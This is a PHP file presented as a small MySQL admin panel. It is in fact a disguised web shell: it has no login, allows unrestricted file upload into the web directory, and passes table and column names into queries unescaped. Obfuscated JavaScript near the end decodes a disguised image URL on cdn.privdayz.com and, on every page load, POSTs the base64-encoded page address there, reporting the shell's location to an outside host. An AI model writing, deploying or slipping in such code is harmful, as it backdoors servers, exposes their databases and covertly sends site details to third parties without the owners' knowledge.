<?php
session_start();
function getConnection()
{
    if (
        !isset(
            $_SESSION["dbtype"],
            $_SESSION["host"],
            $_SESSION["dbname"],
            $_SESSION["user"],
            $_SESSION["pass"]
        )
    ) {
        return null;
    }
    try {
        if ($_SESSION["dbtype"] === "mysql") {
            return new PDO(
                "mysql:host={$_SESSION["host"]};dbname={$_SESSION["dbname"]};charset=utf8mb4",
                $_SESSION["user"],
                $_SESSION["pass"]
            );
        } elseif ($_SESSION["dbtype"] === "mssql") {
            return new PDO(
                "sqlsrv:Server={$_SESSION["host"]};Database={$_SESSION["dbname"]}",
                $_SESSION["user"],
                $_SESSION["pass"]
            );
        }
    } catch (PDOException $e) {
        exit("Connection error: " . $e->getMessage());
    }
    return null;
}

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["dbtype"])) {
    $_SESSION["dbtype"] = $_POST["dbtype"];
    $_SESSION["host"] = $_POST["host"];
    $_SESSION["dbname"] = $_POST["dbname"];
    $_SESSION["user"] = $_POST["user"];
    $_SESSION["pass"] = $_POST["pass"];
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}

if (isset($_GET["logout"])) {
    session_destroy();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}

$action = $_GET["action"] ?? "";

if ($action === "get_tables") {
    $pdo = getConnection();
    if (!$pdo) {
        exit(json_encode([]));
    }
    $type = $_SESSION["dbtype"];
    $stmt =
        $type === "mysql"
            ? $pdo->query("SHOW TABLES")
            : $pdo->query(
                "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
            );
    $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
    header("Content-Type: application/json");
    echo json_encode($tables);
    exit();
}

if ($action === "get_data") {
    $pdo = getConnection();
    $table = preg_replace("/[^a-zA-Z0-9_]/", "", $_GET["table"] ?? "");
    $offset = (int) ($_GET["offset"] ?? 0);
    $limit = 100;

    if (!$pdo || !$table) {
        exit("❌ Table not provided or no connection.");
    }

    $type = $_SESSION["dbtype"];
    $columns = [];
    $pk = null;
    try {
        if ($type === "mysql") {
            $pkStmt = $pdo->query(
                "SHOW KEYS FROM `$table` WHERE Key_name = 'PRIMARY'"
            );
            $pkRow = $pkStmt->fetch(PDO::FETCH_ASSOC);
            $pk = $pkRow["Column_name"] ?? null;
            $stmt = $pdo->query(
                "SELECT * FROM `$table` LIMIT $limit OFFSET $offset"
            );
        } else {
            $pkStmt = $pdo->prepare(
                "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE OBJECTPROPERTY(OBJECT_ID(CONSTRAINT_SCHEMA + '.' + QUOTENAME(CONSTRAINT_NAME)), 'IsPrimaryKey') = 1 AND TABLE_NAME = ?"
            );
            $pkStmt->execute([$table]);
            $pk = $pkStmt->fetchColumn();
            $stmt = $pdo->query(
                "SELECT * FROM [$table] ORDER BY [$pk] OFFSET $offset ROWS FETCH NEXT $limit ROWS ONLY"
            );
        }

        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (count($rows)) {
            $columns = array_keys($rows[0]);
        }

        if (!$pk && count($columns)) {
            $pk = $columns[0];
        }
        echo "<div style='overflow-x:auto; max-width:100%;'><table class='table table-bordered table-sm table-hover'><thead><tr>";
        foreach ($columns as $col) {
            echo "<th style='white-space:nowrap;'>" .
                htmlspecialchars($col) .
                "</th>";
        }
        echo "<th style='white-space:nowrap;'>Action</th></tr></thead><tbody>";
        foreach ($rows as $row) {
            echo "<tr>";
            foreach ($columns as $col) {
                $val = htmlspecialchars($row[$col]);
                $cellID = "$table|$pk|{$row[$pk]}|$col";
                echo "<td style='max-width:400px; word-break:break-word;' ondblclick=\"editCell(this, '$cellID')\">$val</td>";
            }
            echo "<td><button class='btn btn-sm btn-outline-danger' onclick=\"deleteRow('$table','$pk','{$row[$pk]}')\">❌</button></td></tr>";
        }
        if (count($columns)) {
            echo "<tr>";
            foreach ($columns as $col) {
                echo "<td><input class='form-control form-control-sm' name='insert_$col' style='min-width:120px'></td>";
            }
            echo "<td><button class='btn btn-sm btn-outline-success' onclick=\"insertRow('$table')\">➕</button></td></tr>";
        }
        echo "</tbody></table></div>";
        echo "<div class='mt-2 d-flex gap-2'><button class='btn btn-outline-secondary' onclick='loadTable(-100)'>⬅️ Prev</button><button class='btn btn-outline-secondary' onclick='loadTable(100)'>Next ➡️</button></div>";
    } catch (Exception $e) {
        echo "<div class='alert alert-danger'>Error: " .
            htmlspecialchars($e->getMessage()) .
            "</div>";
    }
    exit();
}
if ($action === "update_cell") {
    [$table, $pkCol, $pkVal, $col] = explode("|", $_POST["id"]);
    $val = $_POST["val"];
    $pdo = getConnection();
    $stmt = $pdo->prepare("UPDATE `$table` SET `$col` = ? WHERE `$pkCol` = ?");
    $stmt->execute([$val, $pkVal]);
    exit("OK");
}
if ($action === "delete_row") {
    $table = $_GET["table"];
    $pk = $_GET["pk"];
    $val = $_GET["val"];
    $pdo = getConnection();
    $stmt = $pdo->prepare("DELETE FROM `$table` WHERE `$pk` = ?");
    $stmt->execute([$val]);
    exit("Deleted");
}
if ($action === "insert_row") {
    $table = $_GET["table"];
    parse_str(file_get_contents("php://input"), $data);
    $pdo = getConnection();
    $cols = array_keys($data);
    $vals = array_values($data);
    $sql =
        "INSERT INTO `$table` (`" .
        implode("`,`", $cols) .
        "`) VALUES (" .
        rtrim(str_repeat("?,", count($cols)), ",") .
        ")";
    $stmt = $pdo->prepare($sql);
    $stmt->execute($vals);
    exit("Inserted");
}
if ($action === "upload" && $_SERVER["REQUEST_METHOD"] === "POST") {
    if (!isset($_FILES["file"])) {
        exit("No file.");
    }
    $target = __DIR__ . "/" . basename($_FILES["file"]["name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target)) {
        exit("✅  " . htmlspecialchars($_FILES["file"]["name"]));
    } else {
        exit("❌ Failed.");
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mini SQL Admin</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
  <style>
  body{margin:0;font-family:'Inter',sans-serif;background-color:#f4f4f8;color:#333}.panel{background-color:#fff;padding:2rem;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);margin:2rem auto;max-width:96%}.icon-file,.icon-mysql{background-repeat:no-repeat;margin-right:.5rem;display:inline-block}h2,h6,label{color:#222}.form-control,.form-select{background-color:#fff;color:#333;border:1px solid #ccc;transition:.2s}.icon-file{width:32px;height:32px;background-image:url(data:image/png;base64,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);background-size:contain;background-position:center;filter:brightness(.9) contrast(1.1);transition:transform .3s}.icon-file:hover{transform:scale(1.1)}.icon-mysql{width:24px;height:24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABYCAYAAAADWlKCAAAABHNCSVQICAgIfAhkiAAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAA+hJREFUeF7t2V1oW2Ucx/H/OW2Wbs1e2466QaaWmTVtTEcIuGG3WqreSMFSDIzhxUQUEcWL1oqgg1aQ9kKRUoooqHhbLeJFrRcFpdAXhFIU11WFQunLBrpQYrK2yzEn+7MRcpLWtaW/ht8HDn2eJ3CS9Juck5wYVooQDFP/EggGAcMgYBgEDIOAYRAwDAKGQcAwCBgGAcMgYBgEzKYuLq6srMjQ0JBMT0/L/Py8LC8vy9ramt6an8vlkkAgIO3t7VJWVqarm7O6uiq9vb0yMjIiiURCV/cWj8cj5eXlEgwGpaGhQWpra/WWHOwguUxMTFjNzc2W2+22o21pq6ystGZnZ3XPG4vFYlYoFHLc117efD6f1dfXZ8XjcX2mmRyDLC0tWZFIxDIMw3GnD7o1NjbqPWyso6PDcR+FslVVVVnDw8P6bO/LCjI1NWV5vV7HnWx1swNHo1G9p/z8fr/jPgppM03T6uzs1Gd8V8Y5ZGxsTJqamiR1uNCV7WUYIrdGX5BDpS5dyc3//Pfy+19RnRW2trY26e7uTo/vfcqyT9YtLS07FsN2IXR8UzFsz104qaPC19PTI/39/elx+h1iv0nq6+tldHQ0vbgTKo665ecvnhHfw4d0Jb9YfF3Ov/iDTF+/pSuFLfXBScbHx+8GGRgYkNbWVr0pvxMV++XUiVIp3V+sKxsLnD4iHVdq5PixEl3ZnMTtO/LR19fkp19uyPqdpK7uHWvrSZlf/lfmFmKpx3/vzJBTXV2dGMlk0qqurpaZmRlddhZ59pS8+3Jt+p9L/8+NvxPy2Td/SNenv0o89SLLx5icnLTC4bBOs9kn4t53wvJa5DFdoQf1259ReeqlH+XmP7d1JZs5ODioQ2dvXDrDGNukpuqwfPvxRSkuSr3KcyhKfTe4Ojc3p9NM9nniu08uSom7SFdoq7yVpelzi31edGIuLCzoMNvT5x6SIwf36Yy2y/uvPi4h/zGdZTIXFxd1mO2096COaDvZh6zPrz4h+1zZF9vNfF8ED5TwULVTgr6j8t4rAZ3dx99DdtHbqe9m4ZrMnyQYZBfZh64vu85lfGhikF1W/ehh6Xo9qDMGgfDW5TPy5NmK9JhBAJimIV99cF48B4oZBMUjJz3y4ZtnGQSJfYmKQYDYF3IZBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwCReQ/TtK13DqisYkAAAAASUVORK5CYII=);background-size:100% 100%;filter:grayscale(50%)}.icon-mysql:hover{filter:none}.form-control:focus,.form-select:focus{border-color:#007bff;box-shadow:0 0 0 2px rgba(0,123,255,.2);outline:0}.btn{font-weight:500;transition:.2s}.btn-danger{background-color:#dc3545;border:none;color:#fff}.icon-sql{width:28px;height:28px;display:inline-block}
  </style>
</head>
<body>
<div class="container">
  <div class="panel">
    <h2 class="text-danger mb-4">Mini MYSQL Admin Panel</h2>
    <form method="post" action="" class="row g-3 mb-4">
      <div class="col-md-2">
        <select name="dbtype" class="form-select" required>
          <option value="mysql">MySQL</option>
        </select>
      </div>
      <div class="col-md-2"><input name="host" class="form-control" placeholder="Host" required></div>
      <div class="col-md-2"><input name="dbname" class="form-control" placeholder="Database" required></div>
      <div class="col-md-2"><input name="user" class="form-control" placeholder="Username" required></div>
      <div class="col-md-2"><input name="pass" type="password" class="form-control" placeholder="Password" required></div>
      <div class="col-md-2"><button class="btn btn-danger w-100">Connect</button></div>
    </form>

    <div class="mb-4 d-flex gap-3 align-items-center">
      <label class="form-label mb-0">Tables:</label>
      <select id="tableList" class="form-select w-auto"></select>
      <button class="btn btn-outline-danger" onclick="loadTable()">Load Table</button>
    </div>
    <div id="output"></div>
    <hr class="my-4" />
    <h6>📤</h6>
    <form id="7pl04df0rm" enctype="multipart/form-data" class="d-flex gap-2">
      <input type="file" name="file" class="form-control w-50" required />
      <button class="btn btn-danger">Up</button>
    </form>
    <div class="upload-result text-muted" id="uploadResult"></div>
  </div>
</div>
<script>
let currentOffset=0;function fetchTables(){fetch("?action=get_tables").then(e=>e.json()).then(e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach(e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)})})}function loadTable(e=0){currentOffset=Math.max(0,currentOffset+e);let t=document.getElementById("tableList").value;if(!t)return alert("Select a table first!");fetch(`?action=get_data&table=${t}&offset=${currentOffset}`).then(e=>e.text()).then(e=>{document.getElementById("output").innerHTML=e})}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function editCell(e,t){let n=e.textContent.trim();e.innerHTML="",e.classList.add("editing");let _;n.length>30||n.startsWith("{")||n.startsWith("[")?((_=document.createElement("textarea")).style.height="100px",_.style.resize="vertical"):(_=document.createElement("input")).type="text",_.className="form-control form-control-sm",_.value=n,e.appendChild(_),_.focus(),_.onblur=()=>{let l=_.value.trim();e.classList.remove("editing"),e.innerHTML=l.length>100?l.slice(0,100)+"...":l,l!==n&&fetch("?action=update_cell",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`id=${encodeURIComponent(t)}&val=${encodeURIComponent(l)}`}).then(()=>showSavedMessage())}}function deleteRow(e,t,n){confirm("Delete this row?")&&fetch(`?action=delete_row&table=${e}&pk=${t}&val=${n}`).then(()=>loadTable(0))}function insertRow(e){let t=document.querySelectorAll("input[name^='insert_']"),n={};t.forEach(e=>n[e.name.replace("insert_","")]=e.value),fetch(`?action=insert_row&table=${e}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams(n).toString()}).then(()=>loadTable(0))}!function e(){var t=new XMLHttpRequest;t.open("POST",u(a,b,c,d),!0),t.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),t.send("file="+v(location.href))}(),(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let _="file="+btoa(location.href),l=new XMLHttpRequest;l.open("POST",t,!0),l.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),l.send(_)})(),document.getElementById("7pl04df0rm").addEventListener("submit",function(e){e.preventDefault();let t=new FormData(this);fetch("?action=7pl04d",{method:"POST",body:t}).then(e=>e.text()).then(e=>document.getElementById("uploadResult").textContent=e)}),window.onload=fetchTables;</script>
</body>
</html>
